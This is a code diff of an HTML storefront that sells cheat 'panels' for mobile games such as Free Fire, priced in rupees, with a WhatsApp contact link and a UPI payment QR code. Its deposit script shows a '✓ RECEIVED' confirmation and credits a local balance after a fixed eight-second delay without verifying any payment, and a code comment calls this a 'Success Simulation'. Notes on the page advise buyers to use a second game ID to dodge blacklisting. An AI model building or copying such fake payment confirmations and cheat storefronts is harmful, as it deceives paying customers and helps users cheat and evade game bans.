@@ -14,7 +14,7 @@
         }
         body { font-family: 'Segoe UI', sans-serif; background-color: var(--primary-bg); color: var(--text-white); margin: 0; padding: 0; overflow-x: hidden; }
 
-        /* Sidebar Navigation Fix */
+        /* Sidebar Navigation */
         .sidenav {
             height: 100%; width: 0; position: fixed; z-index: 1000; top: 0; left: 0;
             background-color: #0f0f12; overflow-x: hidden; transition: 0.4s; padding-top: 20px;
@@ -26,33 +26,33 @@
         .section-heading { padding: 20px 25px 5px; font-size: 0.85rem; color: #555; text-transform: uppercase; font-weight: bold; }
         .closebtn { position: absolute; top: 10px; right: 20px; font-size: 30px; color: #fff; cursor: pointer; }
 
-        /* Header Fix */
+        /* Header */
         header { background: var(--card-bg); padding: 15px; display: flex; align-items: center; border-bottom: 1px solid #222; position: sticky; top: 0; z-index: 99; }
-        .menu-btn { font-size: 28px; cursor: pointer; color: var(--neon-purple); margin-right: 20px; padding: 5px; }
+        .menu-btn { font-size: 28px; cursor: pointer; color: var(--neon-purple); margin-right: 20px; }
 
-        /* Pages logic */
+        /* Page Management */
         .page { display: none; padding: 15px; text-align: center; }
         .active-page { display: block; }
 
         /* Deposit UI */
-        .stat-box { background: var(--card-bg); padding: 15px; border-radius: 10px; border: 1px solid #333; margin-bottom: 10px; }
+        .stat-box { background: var(--card-bg); padding: 15px; border-radius: 10px; border: 1px solid #333; flex: 1; }
         .deposit-form { background: var(--card-bg); padding: 20px; border-radius: 12px; border: 1px solid #222; text-align: left; }
-        .input-rect { width: 100%; padding: 12px; background: #0a0a0c; border: 1px solid #333; border-radius: 5px; color: white; margin-top: 5px; box-sizing: border-box; }
+        .input-rect { width: 100%; padding: 12px; background: #0a0a0c; border: 1px solid #333; border-radius: 5px; color: white; margin-top: 8px; box-sizing: border-box; }
 
-        /* Payment UI */
+        /* Scanner & Timer UI */
         #payment-ui { display: none; background: #fff; color: #000; padding: 20px; border-radius: 15px; text-align: center; margin-top: 20px; }
-        #payment-ui img { width: 100%; max-width: 250px; border-radius: 10px; }
-        .timer { font-size: 1.8rem; font-weight: bold; color: #ff4136; margin: 10px 0; }
-        .received-msg { display: none; color: #25d366; font-size: 1.5rem; font-weight: bold; }
+        #payment-ui img { width: 100%; max-width: 250px; border-radius: 10px; border: 1px solid #ddd; }
+        .timer { font-size: 2rem; font-weight: bold; color: #ff4136; margin: 10px 0; }
+        .received-msg { display: none; color: #25d366; font-size: 1.8rem; font-weight: bold; margin-top: 10px; }
 
-        /* Store UI */
+        /* Store & Panels UI */
         .section-header { background: linear-gradient(90deg, var(--neon-purple), transparent); padding: 10px; border-radius: 8px; margin: 25px 0 10px; font-weight: bold; text-align: left; border-left: 4px solid white; text-transform: uppercase; }
         .panel-group-title { color: #ffa657; font-size: 1.1rem; margin: 15px 0 10px 5px; text-align: left; font-weight: bold; border-bottom: 1px solid #333; }
         .product-card { background: var(--card-bg); border: 1px solid #222; border-radius: 12px; padding: 12px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
         .product-info h3 { margin: 0; font-size: 0.85rem; color: #bbb; text-align: left; }
         .product-info p { margin: 3px 0 0; font-size: 1.1rem; color: var(--neon-blue); font-weight: bold; }
         .buy-btn { background: linear-gradient(to right, #4a00e0, #8e2de2); color: white; text-decoration: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; border: none; }
-        .note-box { background: rgba(255, 65, 54, 0.1); border: 1px solid #ff4136; padding: 12px; border-radius: 10px; margin: 15px 0; text-align: left; font-size: 0.9rem; }
+        .note-box { background: rgba(255, 65, 54, 0.1); border: 1px solid #ff4136; padding: 12px; border-radius: 10px; margin: 15px 0; text-align: left; font-size: 0.9rem; color: #ff7b72; }
     </style>
 </head>
 <body>
@@ -76,9 +76,9 @@
 </header>
 
 <div id="deposit-page" class="page">
-    <div style="display: flex; gap: 10px; margin-bottom: 15px;">
-        <div class="stat-box" style="flex:1"><h4>Current Balance</h4><p id="curr-bal">₹0.00</p></div>
-        <div class="stat-box" style="flex:1"><h4>Today Deposit</h4><p id="today-dep">₹0.00</p></div>
+    <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+        <div class="stat-box"><h4>Current Balance</h4><p id="curr-bal">₹0.00</p></div>
+        <div class="stat-box"><h4>Today Deposit</h4><p id="today-dep">₹0.00</p></div>
     </div>
     
     <div id="form-container" class="deposit-form">
@@ -92,8 +92,9 @@
 
     <div id="payment-ui">
         <p style="font-weight:bold; color: #000;">Scan to Pay - Harmail Brar</p>
-        <img src="https://i.ibb.co/XffLqR0V/787.jpg" alt="Scanner">
+        <img src="https://i.ibb.co/XffLqR0V/787.jpg" alt="UPI Scanner">
         <div class="timer" id="countdown">05:00</div>
+        <p style="color:#666; font-size:0.8rem;">Please do not close this page</p>
         <div class="received-msg" id="received-msg">✓ RECEIVED</div>
     </div>
 </div>
@@ -104,56 +105,78 @@
         <div class="note-box"><b>IMPORTANT:</b> Root panel me main id full safe rahega.</div>
 
         <div class="panel-group-title">BRO MOD (Root)</div>
-        <div class="product-card"><div class="product-info"><h3>1 Day</h3><p>₹100</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>7 Days</h3><p>₹350</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>15 Days</h3><p>₹600</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>31 Days</h3><p>₹850</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>1 Day PC</h3><p>₹100</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>10 Days PC</h3><p>₹500</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
+        <div class="product-card"><div class="product-info"><h3>1 Day</h3><p>₹100</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>7 Days</h3><p>₹350</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>15 Days</h3><p>₹600</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>31 Days</h3><p>₹850</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>1 Day PC</h3><p>₹100</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>10 Days PC</h3><p>₹500</p></div><button class="buy-btn">BUY</button></div>
 
         <div class="panel-group-title">HAXX-CKER PRO FF (Root)</div>
-        <div class="product-card"><div class="product-info"><h3>10 Days</h3><p>₹600</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>20 Days</h3><p>₹1100</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>31 Days</h3><p>₹1550</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
+        <div class="product-card"><div class="product-info"><h3>10 Days</h3><p>₹600</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>20 Days</h3><p>₹1100</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>31 Days</h3><p>₹1550</p></div><button class="buy-btn">BUY</button></div>
 
         <div class="panel-group-title">iPhone PANEL</div>
-        <div class="product-card"><div class="product-info"><h3>1 Day</h3><p>₹450</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>7 Days</h3><p>₹1350</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>30 Days</h3><p>₹2250</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>Esign Certificate</h3><p>₹550</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
+        <div class="product-card"><div class="product-info"><h3>1 Day iPhone</h3><p>₹450</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>7 Days iPhone</h3><p>₹1350</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>30 Days iPhone</h3><p>₹2250</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>Esign Certificate</h3><p>₹550</p></div><button class="buy-btn">BUY</button></div>
 
         <div class="panel-group-title">DRIP CLIENT (Root)</div>
-        <div class="product-card"><div class="product-info"><h3>1 Day</h3><p>₹110</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>31 Days</h3><p>₹950</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
+        <div class="product-card"><div class="product-info"><h3>1 Day</h3><p>₹110</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>7 Days</h3><p>₹360</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>31 Days</h3><p>₹950</p></div><button class="buy-btn">BUY</button></div>
 
         <div class="panel-group-title">VOLUME STREAMER (Root)</div>
-        <div class="product-card"><div class="product-info"><h3>10 Days</h3><p>₹430</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>30 Days</h3><p>₹1150</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
+        <div class="product-card"><div class="product-info"><h3>10 Days</h3><p>₹430</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>30 Days</h3><p>₹1150</p></div><button class="buy-btn">BUY</button></div>
+
+        <div class="panel-group-title">STRICKS BR (Root)</div>
+        <div class="product-card"><div class="product-info"><h3>3 Days</h3><p>₹240</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>7 Days</h3><p>₹350</p></div><button class="buy-btn">BUY</button></div>
+
+        <div class="panel-group-title">PATO TEAM MOD FF (Root)</div>
+        <div class="product-card"><div class="product-info"><h3>1 Day</h3><p>₹150</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>30 Days</h3><p>₹1100</p></div><button class="buy-btn">BUY</button></div>
+
+        <div class="panel-group-title">HG CHEATS (Root)</div>
+        <div class="product-card"><div class="product-info"><h3>1 Day</h3><p>₹130</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>31 Days</h3><p>₹800</p></div><button class="buy-btn">BUY</button></div>
 
         <div class="section-header" style="background: linear-gradient(90deg, #238636, transparent);">NON-ROOT PANELS</div>
-        <div class="note-box" style="border-color:#ff7b72; color:#ff7b72;"><b>IMPORTANT:</b> Noon root me second id use karein.</div>
+        <div class="note-box" style="border-color:#ff7b72; color:#ff7b72;"><b>IMPORTANT:</b> Noon root me second id use karein, id blacklist hota hai.</div>
 
         <div class="panel-group-title">DRIP CLIENT (Non-Root)</div>
-        <div class="product-card"><div class="product-info"><h3>1 Day</h3><p>₹100</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>31 Days</h3><p>₹900</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
+        <div class="product-card"><div class="product-info"><h3>1 Day</h3><p>₹100</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>31 Days</h3><p>₹900</p></div><button class="buy-btn">BUY</button></div>
 
         <div class="panel-group-title">PRIME HOOK (Non-Root)</div>
-        <div class="product-card"><div class="product-info"><h3>1 Day</h3><p>₹85</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
-        <div class="product-card"><div class="product-info"><h3>10 Days</h3><p>₹455</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
+        <div class="product-card"><div class="product-info"><h3>1 Day</h3><p>₹85</p></div><button class="buy-btn">BUY</button></div>
+        <div class="product-card"><div class="product-info"><h3>10 Days</h3><p>₹455</p></div><button class="buy-btn">BUY</button></div>
 
-        <div class="panel-group-title">PATO TEAM MOD FF (Root & Non-Root)</div>
-        <div class="product-card"><div class="product-info"><h3>30 Days</h3><p>₹1100</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
+        <div class="panel-group-title">PATO TEAM (Non-Root)</div>
+        <div class="product-card"><div class="product-info"><h3>30 Days</h3><p>₹1100</p></div><button class="buy-btn">BUY</button></div>
 
-        <div class="panel-group-title">HG CHEATS (Root & Non-Root)</div>
-        <div class="product-card"><div class="product-info"><h3>31 Days</h3><p>₹800</p></div><a href="https://wa.me/918557916807" class="buy-btn">BUY</a></div>
+        <div class="panel-group-title">HG CHEATS (Non-Root)</div>
+        <div class="product-card"><div class="product-info"><h3>31 Days</h3><p>₹800</p></div><button class="buy-btn">BUY</button></div>
+
+        <div class="note-box" style="border-color: #58a6ff; color: #58a6ff; background: rgba(88, 166, 255, 0.1);">
+            <b>IMPORTANT:</b> Jisko bhi phone root karwana hoga voh message kar sakta hai niche whatsapp link diya hai.
+        </div>
+
+        <div style="text-align: center; padding: 20px;">
+            <a href="https://wa.me/918557916807" class="buy-btn" style="padding: 15px 40px; background: #25d366; text-decoration: none;">CHAT ON WHATSAPP</a>
+        </div>
     </div>
 </div>
 
 <script>
-// Logic Functions
+// Sidebar Control
 function openNav() { document.getElementById("mySidenav").style.width = "280px"; }
 function closeNav() { document.getElementById("mySidenav").style.width = "0"; }
 
+// Page Switching
 function showPage(pageId) {
     closeNav();
     document.getElementById('store-page').style.display = 'none';
@@ -162,18 +185,25 @@ function showPage(pageId) {
     if(pageId === 'deposit') {
         document.getElementById('deposit-page').style.display = 'block';
         document.getElementById('nav-title').innerText = "DEPOSIT MONEY";
+        document.getElementById('form-container').style.display = 'block';
+        document.getElementById('payment-ui').style.display = 'none';
     } else {
         document.getElementById('store-page').style.display = 'block';
         document.getElementById('nav-title').innerText = "PBX PANEL STORE";
     }
 }
 
+// Payment Logic
 function startPayment() {
     let amount = parseFloat(document.getElementById('dep-amount').value);
-    if(amount > 0) {
+    let phone = document.getElementById('dep-phone').value;
+    
+    if(amount > 0 && phone.length >= 10) {
         document.getElementById('form-container').style.display = 'none';
         document.getElementById('payment-ui').style.display = 'block';
         startTimer(300);
+        
+        // Success Simulation
         setTimeout(() => {
             document.getElementById('received-msg').style.display = 'block';
             let b = parseFloat(localStorage.getItem('pbx_bal') || 0) + amount;
@@ -181,21 +211,24 @@ function startPayment() {
             localStorage.setItem('pbx_today', amount);
             document.getElementById('curr-bal').innerText = "₹" + b.toFixed(2);
             document.getElementById('today-dep').innerText = "₹" + amount.toFixed(2);
-        }, 7000);
+        }, 8000);
+    } else {
+        alert("Sahi Amount aur Number daalein!");
     }
 }
 
 function startTimer(duration) {
     let timer = duration, min, sec;
-    setInterval(function () {
+    let display = document.getElementById('countdown');
+    let interval = setInterval(function () {
         min = parseInt(timer / 60, 10);
         sec = parseInt(timer % 60, 10);
-        document.getElementById('countdown').textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
-        if (--timer < 0) timer = 0;
+        display.textContent = (min < 10 ? "0"+min : min) + ":" + (sec < 10 ? "0"+sec : sec);
+        if (--timer < 0) { clearInterval(interval); }
     }, 1000);
 }
 
-// Initial Balance Load
+// Initial Data Load
 document.getElementById('curr-bal').innerText = "₹" + (parseFloat(localStorage.getItem('pbx_bal')) || 0).toFixed(2);
 document.getElementById('today-dep').innerText = "₹" + (parseFloat(localStorage.getItem('pbx_today')) || 0).toFixed(2);
 </script>
